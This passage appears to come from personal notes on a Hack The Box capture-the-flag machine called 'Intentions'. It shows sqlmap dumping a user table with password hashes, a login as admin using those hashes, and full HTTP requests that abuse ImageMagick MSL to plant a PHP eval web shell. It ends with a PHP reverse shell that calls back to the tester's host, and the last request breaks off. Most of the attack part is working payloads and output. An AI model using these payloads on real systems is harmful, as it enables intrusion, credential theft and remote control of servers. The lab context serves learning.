+| 22 | Eugene Okuneva I         | 0     | shyatt@example.com            | food,travel,nature        | $2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 23 | Mrs. Rhianna Hahn DDS    | 0     | sierra.russel@example.com     | food,travel,nature        | $2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 24 | Viola Vandervort DVM     | 0     | ferry.erling@example.com      | food,travel,nature        | $2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 25 | Prof. Margret Von Jr.    | 0     | beryl68@example.org           | food,travel,nature        | $2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 26 | Florence Crona           | 0     | ellie.moore@example.net       | food,travel,nature        | $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 27 | Tod Casper               | 0     | littel.blair@example.org      | food,travel,nature        | $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 28 | dam                      | 0     | dam@htb.com                   | food,__REFLECTED_VALUE__# | $2y$10$ycKggG9qdZtYS5b7R0iM4eAMDJVCNSTXW59mmExC6e0czHq0UY.ae | 2023-07-04 18:42:58 | 2023-07-04 18:48:29 |
++----+--------------------------+-------+-------------------------------+---------------------------+--------------------------------------------------------------+---------------------+---------------------+
+
+[19:48:26] [INFO] table &#x27;intentions.users&#x27; dumped to CSV file &#x27;/home/htb-yougotgot/.local/share/sqlmap/output/intentions.htb/dump/intentions/users.csv&#x27;
+[19:48:26] [INFO] fetching columns for table &#x27;personal_access_tokens&#x27; in database &#x27;intentions&#x27;
+[19:48:26] [INFO] fetching entries for table &#x27;personal_access_tokens&#x27; in database &#x27;intentions&#x27;
+[19:48:26] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[19:48:26] [INFO] fetching number of entries for table &#x27;personal_access_tokens&#x27; in database &#x27;intentions&#x27;
+[19:48:27] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;--threads&#x27; for faster data retrieval
+[19:48:27] [INFO] retrieved: 0
+[19:48:27] [WARNING] table &#x27;personal_access_tokens&#x27; in database &#x27;intentions&#x27; appears to be empty
+Database: intentions
+Table: personal_access_tokens
+[0 entries]
++----+--------------+------+-------+-----------+------------+------------+--------------+----------------+
+| id | tokenable_id | name | token | abilities | created_at | updated_at | last_used_at | tokenable_type |
++----+--------------+------+-------+-----------+------------+------------+--------------+----------------+
++----+--------------+------+-------+-----------+------------+------------+--------------+----------------+
+
+[19:48:27] [INFO] table &#x27;intentions.personal_access_tokens&#x27; dumped to CSV file &#x27;/home/htb-yougotgot/.local/share/sqlmap/output/intentions.htb/dump/intentions/personal_access_tokens.csv&#x27;
+[19:48:27] [INFO] fetching columns for table &#x27;gallery_images&#x27; in database &#x27;intentions&#x27;
+[19:48:27] [INFO] fetching entries for table &#x27;gallery_images&#x27; in database &#x27;intentions&#x27;
+Database: intentions
+Table: gallery_images
+[19 entries]
++----+---------------------------------------------------------------+--------------+---------------------+---------------------+
+| id | file                                                          | genre        | created_at          | updated_at          |
++----+---------------------------------------------------------------+--------------+---------------------+---------------------+
+| 1  | public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg              | animals      | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 2  | public/animals/dickens-lin-Nr7QqJIP8Do-unsplash.jpg           | animals      | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 3  | public/animals/dickens-lin-tycqN7-MY1s-unsplash.jpg           | animals      | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 4  | public/animals/jevgeni-fil-rz2Nh0U8vws-unsplash.jpg           | animals      | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 5  | public/animals/kristin-o-karlsen-u8aXoDEcDR0-unsplash.jpg     | animals      | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 6  | public/architecture/axp-photography-EU1sTG7DGxE-unsplash.jpg  | architecture | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 7  | public/architecture/k-t-francis-kHm0iLOj2zg-unsplash.jpg      | architecture | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 8  | public/architecture/leopold-baskarad-BcIr38tPxJ8-unsplash.jpg | architecture | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 9  | public/architecture/nico-baum-LudJh7dPfv4-unsplash.jpg        | architecture | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 10 | public/food/anto-meneghini-sJ4ix9_AjAc-unsplash.jpg           | food         | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 11 | public/food/dan-9-f4enU0AY0-unsplash.jpg                      | food         | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 12 | public/food/fatemeh-rz--RqVu65QrTM-unsplash.jpg               | food         | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 13 | public/food/jonathan-borba-BMpBW2476wQ-unsplash.jpg           | food         | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 14 | public/food/rod-long--LMw-y4gxac-unsplash.jpg                 | food         | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 15 | public/nature/edoardo-botez-rm8q_Gy2iJs-unsplash.jpg          | nature       | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 16 | public/nature/laura-adai-mxGR7FogG10-unsplash.jpg             | nature       | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 17 | public/nature/marek-piwnicki-urmnC74otpA-unsplash.jpg         | nature       | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 18 | public/nature/marek-piwnicki-VOv4uaMf9E4-unsplash.jpg         | nature       | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
+| 19 | public/nature/rafael-garcin-GsQ0iSb88HY-unsplash.jpg          | nature       | 2023-02-02 17:41:52 | 2023-02-02 17:41:52 |
++----+---------------------------------------------------------------+--------------+---------------------+---------------------+
+
+[19:48:27] [INFO] table &#x27;intentions.gallery_images&#x27; dumped to CSV file &#x27;/home/htb-yougotgot/.local/share/sqlmap/output/intentions.htb/dump/intentions/gallery_images.csv&#x27;
+[19:48:27] [INFO] fetching columns for table &#x27;migrations&#x27; in database &#x27;intentions&#x27;
+[19:48:27] [INFO] fetching entries for table &#x27;migrations&#x27; in database &#x27;intentions&#x27;
+Database: intentions
+Table: migrations
+[4 entries]
++----+-------+-------------------------------------------------------+
+| id | batch | migration                                             |
++----+-------+-------------------------------------------------------+
+| 1  | 1     | 2014_10_12_000000_create_users_table                  |
+| 2  | 1     | 2019_12_14_000001_create_personal_access_tokens_table |
+| 3  | 1     | 2023_02_01_014219_create_gallery_image_table          |
+| 4  | 1     | 2023_02_02_014532_add_users_admin_column              |
++----+-------+-------------------------------------------------------+
+
+[19:48:27] [INFO] table &#x27;intentions.migrations&#x27; dumped to CSV file &#x27;/home/htb-yougotgot/.local/share/sqlmap/output/intentions.htb/dump/intentions/migrations.csv&#x27;
+[19:48:27] [INFO] fetched data logged to text files under &#x27;/home/htb-yougotgot/.local/share/sqlmap/output/intentions.htb&#x27;
+[19:48:27] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 19:48:27 /2023-07-04/</code></pre><p id="1835ff1f-034c-403e-9c4e-0d6481019671" class="">
+</p><p id="76987972-5cf6-4d61-aa30-e2ed8d546bd4" class="">Steve and Greg are admins from the DB</p><p id="a788cb3c-b951-433c-af5f-1972404dc228" class="">| 1  | steve                    | 1     | steve@intentions.htb          | food,travel,nature        | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 |<br/>| 2  | greg                     | 1     | greg@intentions.htb           | food,travel,nature        | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 2023-02-02 17:44:11 | 2023-02-02 17:44:11 |<br/></p><p id="914e712a-2f5a-4ce6-a271-80c35b542ad5" class="">
+</p><p id="5e633a4d-bc26-4838-9f14-ea50c650dcc8" class="">We added the tamper method space2comment as the site would give us sort of a hint/direction how can we exploit this</p><p id="9d4fcfeb-9ebd-430a-9046-3d60599ed51b" class="">
+</p><p id="20e2abbb-7582-47eb-8c88-2b211d82dba4" class="">List of the techniques for sqlmap</p><ul id="11ec3744-5395-4d55-b64f-d6c162aa2b06" class="bulleted-list"><li style="list-style-type:disc">B: Boolean-based blind</li></ul><ul id="0d8c99f6-e5e1-461e-ad94-52fc2031370d" class="bulleted-list"><li style="list-style-type:disc">E: Error-based</li></ul><ul id="50192000-4bf7-44de-8394-5cd086b682b5" class="bulleted-list"><li style="list-style-type:disc">U: Union query-based</li></ul><ul id="59bf9152-0580-4ee8-899f-82e6f8ea0b9b" class="bulleted-list"><li style="list-style-type:disc">S: Stacked queries</li></ul><ul id="49884b43-c2e9-4109-a828-79c41158a4d1" class="bulleted-list"><li style="list-style-type:disc">T: Time-based blind</li></ul><ul id="42339e42-f571-409f-a489-d1c677cc905a" class="bulleted-list"><li style="list-style-type:disc">Q: Inline queries</li></ul><p id="4c486011-7510-4c16-8193-5c93604c6e50" class="">
+</p><p id="be2b7602-95a3-4295-9853-153cc975e82b" class="">One username, who is admin</p><p id="2c7cae92-28cd-41c6-adb6-9deb2ba04dfb" class="">steve@intention</p><p id="ffa4499f-90bb-4b18-9eaa-6e01f344d5f2" class="">
+</p><p id="a6a311d5-b01a-4d4d-8feb-d185a50cd844" class="">Exploring the api there is an additional one which is v2 instead of v1, which is where we can use the hash for greg or steve, and we should be authenticated as the admin</p><p id="065c33b1-5d65-452a-9706-1dd09cc03bcd" class=""><code>POST /api/v2/auth/login</code></p><figure id="58326352-bd55-45cb-9a22-ce73e9534123" class="image"><a href="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled%201.png"><img style="width:1648px" src="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled%201.png"/></a></figure><p id="69140041-3205-4d87-bc57-6182d2b2302a" class="">
+</p><p id="222c9017-aa9d-44e6-ad82-0cbe5b665d18" class="">We can login as steve and greg with their respective hashes!</p><p id="f9b01f8a-84d3-4c76-9786-03380d847bd8" class="">
+</p><p id="f34de253-710a-44c0-b0c8-9fd31e4123f5" class="">Now how do we access the page as the users logged?</p><p id="ae82a1bb-ba8b-435f-9b66-b324a47c5efd" class="">Take the generated token and get to the /admin  directory and we are admin!<br/><br/>Token used:<br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="70b15eee-bee1-4aa0-ba4c-db2c02462ab2" class="code"><code class="language-Rust">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1MjE1MDIsImV4cCI6MTY4ODU0MzEwMiwibmJmIjoxNjg4NTIxNTAyLCJqdGkiOiJmVFBjZERZeWs3RjVVQVNnIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.FZQHkw5-uyWjXn2OipvOaDcQFPaUp9K7ZXTK38unncY</code></pre><p id="32ffebbd-6e54-4ec7-9ec2-9e0691e485d6" class="">
+</p><p id="c9d12104-f33d-4c06-b471-6851a103e57e" class="">As admin we can edit images with imagemagick</p><p id="403b9fe1-5716-4569-85dc-19f0988f8c3f" class=""><code>http://intentions.htb/admin#/image/1</code></p><figure id="62b0ec61-2aa3-4fb4-8648-79add19dfb6e" class="image"><a href="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled%202.png"><img style="width:1884px" src="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled%202.png"/></a></figure><p id="c9529309-32c0-46e2-8543-49299b95cb1d" class="">
+</p><p id="55702e13-bf13-4c67-821f-45b11c58e372" class="">If we intercept a request in burp we got this interesting thing:</p><figure id="e2a4e2cd-55e4-4b7c-bc7b-57dc7822d479" class="image"><a href="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled%203.png"><img style="width:1651px" src="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled%203.png"/></a></figure><p id="83df637d-f5de-4087-93db-913b02a4151f" class="">
+</p><p id="e23816ab-3036-4299-841e-1f8421fa1293" class="">As seen from the forum can we use text to image conversion for LFI?</p><p id="adbc6adc-d77d-495e-bdea-7c1ab57bf732" class="">
+</p><p id="a9d4c2b1-5a4c-4ae0-8efd-2920fe745a23" class="">This would be the burp request that goes sent to upload a file with LFI, keep getting 502 bad gateway</p><p id="4decfc3a-d9f1-42bc-9b08-3b4a294bf794" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1f2cc9e2-4dc0-45e8-9da5-d32e624862bf" class="code"><code class="language-Rust">POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&amp;effect=none HTTP/1.1
+Host: intentions.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-XSRF-TOKEN: eyJpdiI6Imdqb2JJMW0yL251QldzWGRKQVI3Q2c9PSIsInZhbHVlIjoiKzVBcmxNYmMzSmt1UTk3Q2ZqZFFBSUFkRHBHaDdncFllZG5LYjVLWHNDMHYxYVV6ZUZ4cVNpMlpWcUxPRzRsOG9ZdzROQ3pVaFRGQ1ZDSGVPVkVEYXVLeDRZOTVYV3pmMkp4QjNiRkorMTZGU29OUDI2M1UzRCtDZDJOM0lDN2MiLCJtYWMiOiI2ZTUxYjMzYTBhZjE1ZjkyZmUyMDZiNzYzYTMwMWQ0NTBjZmZhZTcxYjgyOTJhZWM3MTVjMTk0MjQ4NDRhZjI0IiwidGFnIjoiIn0=
+Content-Length: 322
+Origin: http://intentions.htb
+DNT: 1
+Connection: close
+Referer: http://intentions.htb/admin
+Cookie: XSRF-TOKEN=eyJpdiI6Imdqb2JJMW0yL251QldzWGRKQVI3Q2c9PSIsInZhbHVlIjoiKzVBcmxNYmMzSmt1UTk3Q2ZqZFFBSUFkRHBHaDdncFllZG5LYjVLWHNDMHYxYVV6ZUZ4cVNpMlpWcUxPRzRsOG9ZdzROQ3pVaFRGQ1ZDSGVPVkVEYXVLeDRZOTVYV3pmMkp4QjNiRkorMTZGU29OUDI2M1UzRCtDZDJOM0lDN2MiLCJtYWMiOiI2ZTUxYjMzYTBhZjE1ZjkyZmUyMDZiNzYzYTMwMWQ0NTBjZmZhZTcxYjgyOTJhZWM3MTVjMTk0MjQ4NDRhZjI0IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkZsRUZKR2FTd2k5MG5xVmx2UmhRQ0E9PSIsInZhbHVlIjoiWmZUUDQ5SG9XR2pDdlB1d2tCbTAvTmVuT0ZyYnFXd3BaR0RML2pTaFMrRnZlMDd0U3ZIMmxzTnFKdUY1a1dzUE41eVZsL1FnWjBiTG1NNFZ4TEZoTDh5emVoRGxsWDVVTC8yWjhuOGlGYXBzRTc3V0ZTMTJXN2RxMjRTUXZaaHAiLCJtYWMiOiJjMDRiODQwNDY3ZDZlNzliNTUzMjE0ZTk3MzgwNWY0YzdiYmI1MTc0MmI4MjkyMDdhOWMxMjc1OGY3NDhiYmM2IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg2NTAwMTYsImV4cCI6MTY4ODY3MTYxNiwibmJmIjoxNjg4NjUwMDE2LCJqdGkiOiJrZmxCQUg3ZnV2ME1sYWNWIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.iSV8Te5vvUsj60k5GqUPXUh-WIaiBgOSHmld_TsqHY8
+Content-Type: multipart/form-data; boundary=ABC
+
+
+--ABC
+Content-Disposition: form-data; name=&quot;exec&quot;; filename=&quot;exec.msl&quot;
+Content-Type: text/plain
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;image&gt;
+  &lt;read filename=&quot;http://10.10.14.54:8000/positive.png&quot; /&gt;
+	&lt;write filename=&quot;/var/www/html/intentions/storage/app/public/animals/tmp/rev.php&quot; /&gt;
+&lt;/image&gt;
+--ABC</code></pre><p id="fb7243e3-c03b-40dc-a7b0-8ebdfe8e6e00" class="">
+</p><p id="cbb6bdba-60e4-46d4-b7e2-594ff4d9ac44" class="">Final payload that worked from burp and we have code execution:</p><p id="2f47e718-e1fc-4090-ab80-0e583d64ebe6" class="">Used the caption and info, without uploading any file to the machine directly from my machine..</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d2909215-8b89-4e83-8d70-a3594c581c3e" class="code"><code class="language-Rust">POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&amp;effect=none HTTP/1.1
+Host: intentions.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-XSRF-TOKEN: eyJpdiI6Ik1GRzJET2FBZHhvMFA1N0dFRUFFbnc9PSIsInZhbHVlIjoiZ0VDOE15ZGd3cFFHV0JyK2ZNNDU2YWZVcUYyYjkyTEZvRTdJTzBGbCtnTXg2TFB1Y0Y1aDFLRTY5SFk5a2N5NWFCODFIbTJWUGJ6YUt6QkYwVTJaMzdtcTN4b3plK3NwMTFkbnllM0ZKV3dvclNBajVGMElSQmpIc2VuMUpuZVMiLCJtYWMiOiJlYmNjNjFiYTEyMDhlNjI2YTliM2FkMjU2YzZmNzQxNDg1NTBkOWY3MzJhZDA0NTFiNzVjOWJkZjJmNzlhZGMxIiwidGFnIjoiIn0=
+Content-Length: 318
+Origin: http://intentions.htb
+DNT: 1
+Connection: close
+Referer: http://intentions.htb/admin/
+Cookie: XSRF-TOKEN=eyJpdiI6Ik1GRzJET2FBZHhvMFA1N0dFRUFFbnc9PSIsInZhbHVlIjoiZ0VDOE15ZGd3cFFHV0JyK2ZNNDU2YWZVcUYyYjkyTEZvRTdJTzBGbCtnTXg2TFB1Y0Y1aDFLRTY5SFk5a2N5NWFCODFIbTJWUGJ6YUt6QkYwVTJaMzdtcTN4b3plK3NwMTFkbnllM0ZKV3dvclNBajVGMElSQmpIc2VuMUpuZVMiLCJtYWMiOiJlYmNjNjFiYTEyMDhlNjI2YTliM2FkMjU2YzZmNzQxNDg1NTBkOWY3MzJhZDA0NTFiNzVjOWJkZjJmNzlhZGMxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImhPUGZxaE9nT1VXYnMwT2xCVzNpeUE9PSIsInZhbHVlIjoiQkdRR1lsSUNNSjhwWFA2OUZLVTZyYkNxRXZZc2FybXhyRVRYL0R3eVk2QllWeVdsWXhnRVY5aUlxeVR5WlZRcm1ldXFpY3ZzQnROK3pZeEtXV2VFUVBUUzQ1NGFBUjN4bUh3ZkZpai9pbUl6dE8zc0xjQi9GRExDeHIvdTdPbjUiLCJtYWMiOiJlN2MzZjFkYzlkMGQyNDVjMjMzNTVhNGUxMDcwNmMxNjI3Y2ExMDViYjQwN2RiMDdiZTY5NTZhNGE4ZDU1ZDhkIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg2NjU1NzUsImV4cCI6MTY4ODY4NzE3NSwibmJmIjoxNjg4NjY1NTc1LCJqdGkiOiJlRWtDamhwS3VaQkd4eDhnIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.1QZrF5uYIcT8vaRMGAZgnETGcrYDcA-KkEt7BKzVUe0
+Content-Type: multipart/form-data, boundary=ABC
+
+--ABC
+Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;
+Content-Type: text/plain
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;image&gt;
+&lt;read filename=&quot;caption:&amp;lt;?php @eval(@$_REQUEST[&#x27;cmd&#x27;]); ?&amp;gt;&quot; /&gt;
+&lt;write filename=&quot;info:/var/www/html/intentions/public/commanders2.php&quot; /&gt;
+&lt;/image&gt;
+--ABC</code></pre><p id="a23f71f0-fbc0-4db7-b43b-0061bf595b9a" class="">
+</p><p id="cf7f0805-2dfe-494b-b0a6-46eb9725dafd" class="">RCE</p><p id="391fe100-af53-408e-b705-7e9642e904a5" class=""><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a></p><p id="c88d8061-33c6-4a4f-81ed-6efb393f6dcd" class="">
+</p><p id="8487a896-23fb-48f7-b8a3-14fb66bdb71c" class="">Page to visit:</p><p id="0b4b9cbc-5272-494f-b7bc-0055164d4c72" class="">http://intentions.htb/newshell.php?cmd=system(&#x27;id&#x27;);</p><p id="61a13129-df57-494a-a22e-e6bf5abd848e" class="">
+</p><p id="fedde69c-1c60-4652-b6b9-30c03182a944" class="">revshell:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8d0c5025-e270-454f-992e-5c1fdc56c59f" class="code"><code class="language-Rust">http://intentions.htb/shell.php?cmd=$sock=fsockopen(%2210.10.14.54%22,8888);$proc=proc_open(%22sh%22,%20array(0=%3E$sock,%201=%3E$sock,%202=%3E$sock),$pipes);
+$sock=fsockopen(&quot;10.10.14.54&quot;,8888);$proc=proc_open(&quot;sh&quot;,%20array(0=&gt;$sock,%201=&gt;$sock,%202=&gt;$sock),$pipes);</code></pre><p id="74e289d5-084a-406d-b9ec-0b77483d131d" class="">
+</p><p id="c037e42d-b29c-4d19-afad-e1235fab6bfb" class="">We are www-data</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="10393a5d-9662-49c7-aab8-ebe67fdb3fc1" class="code"><code class="language-Rust">www-data@intentions:~/html/intentions/public$ whoami
+whoami
+www-data
+www-data@intentions:~/html/intentions/public$ ls -la
+ls -la
+total 40
+drwxr-xr-x  5 www-data www-data 4096 Jul  6 19:10 .
+drwxr-xr-x 14 root     root     4096 Feb  2 17:55 ..
+-rw-r--r--  1 root     root      603 Apr 12  2022 .htaccess
+drwxr-xr-x  2 root     root     4096 Jan 29 20:06 css
+-rw-r--r--  1 root     root        0 Apr 12  2022 favicon.ico
+drwxr-xr-x  3 root     root     4096 Feb  2 17:35 fonts
+-rw-r--r--  1 root     root     1710 Apr 12  2022 index.php
+drwxr-xr-x  2 root     root     4096 Feb  2 17:35 js
+-rw-r--r--  1 root     root      215 Jun 19 11:27 mix-manifest.json
+-rw-r--r--  1 www-data www-data   99 Jul  6 19:10 newshell.php
+-rw-r--r--  1 root     root       24 Apr 12  2022 robots.txt
+lrwxrwxrwx  1 www-data www-data   43 Feb  2 17:08 storage -&gt; /var/www/html/intentions/storage/app/public
+www-data@intentions:~/html/intentions/public$</code></pre><p id="af91e7fc-865b-4849-ade8-04fb3b624460" class="">
+</p><p id="bb05c136-91b0-4d95-8558-5ecb36914b20" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b0aab508-d807-4b1c-9b77-6898dd4207f2" class="code"><code class="language-Rust">POST /api/v2/admin/image/modify HTTP/1.1
+Host: intentions.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-XSRF-TOKEN: eyJpdiI6Ii9WcC9tN3NkTXZPNzk4d1RRZ241QXc9PSIsInZhbHVlIjoiV1FZbHd1bnRqcHRyTUlQWGhmU3FaZTFZRVY5ZVhWSmpESmR4cWRLRmpxUDJKU3RGNmZqMlU5QnBsSXdDWFJ0RHlFL0hyaFdTWDJNY2ZVTFdFbHpvN1JSUzY0N2RuRFVhQnd2ZTZseDFiOEdVakxSTlRNcnBSY0ZQcHNXcHZMbWsiLCJtYWMiOiJkZjZkMzQzN2EyMGI3M2Q4YWQyODI2NDdlNzM3OGE3ODg0MjUwOGI1ZTA3YjA1YjMxODZhN2MyNGQ2YWI3MDUyIiwidGFnIjoiIn0=
+Content-Length: 451
+Origin: http://intentions.htb
+Connection: close
+Referer: http://intentions.htb/admin/
